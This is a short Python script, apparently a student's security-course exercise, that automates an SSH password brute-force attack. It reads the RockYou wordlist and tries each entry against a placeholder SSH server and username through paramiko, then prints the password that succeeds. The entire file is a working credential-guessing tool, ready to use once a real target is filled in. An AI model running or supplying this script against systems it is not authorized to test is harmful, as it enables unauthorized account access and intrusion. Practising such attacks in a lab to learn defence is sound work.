#!/usr/bin/env python3

# Rodolfo Gonzalez
# January 30 2024

# Purpose: Challenge 16: Automate Brute Force Wordlis Attack Tool 2 of 3
import time
import os
import paramiko

# Set the path to the RockYou.txt file
ROCKYOU_PATH = os.path.expanduser("~/Documents/rockyou.txt")

# Set the SSH server information
SSH_IP = "your_ssh_server_ip"  # Replace with the actual IP address of the SSH server
SSH_USERNAME = "your_ssh_username"  # Replace with the actual SSH username

##################### === Function for SSH Brute Force ===###################
def ssh_brute_force():
    try:
        # Open the wordlist file in binary mode and read all lines
        with open(ROCKYOU_PATH, 'rb') as wordlist_file:
            words = [line.strip() for line in wordlist_file.readlines()]

        # Initialize SSH client
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Iterate through and try each word as the password
        for word in words:
            password = word.decode('utf-8', errors='ignore')
            print(f"Attempting password: {password}")

            try:
                # Connect to the SSH server
                ssh_client.connect(SSH_IP, username=SSH_USERNAME, password=password)

                # If successful, print a message and break the loop
                print(f"Password found: {password}")
                break

            except paramiko.AuthenticationException:
                # Password authentication failed, continue with the next password
                pass

        # Close the SSH client
        ssh_client.close()

    except FileNotFoundError:
        print("Word list file not found.")
    except KeyboardInterrupt:
        print("Operation aborted by the user.")

##################### === Main program ===###################
if __name__ == "__main__":
    try:
        ssh_brute_force()
    except KeyboardInterrupt:
        print("Operation aborted by the user.")
